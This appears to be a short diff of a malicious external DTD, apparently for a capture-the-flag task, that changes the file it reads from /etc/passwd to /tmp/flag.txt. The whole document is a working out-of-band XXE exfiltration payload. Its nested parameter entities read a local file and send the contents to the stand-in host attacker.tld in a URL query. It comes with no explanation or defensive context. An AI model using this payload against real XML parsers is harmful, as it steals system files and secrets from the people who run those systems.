@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///tmp/flag.txt">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?leak=%file;'>">
 %eval;
 %exfil;
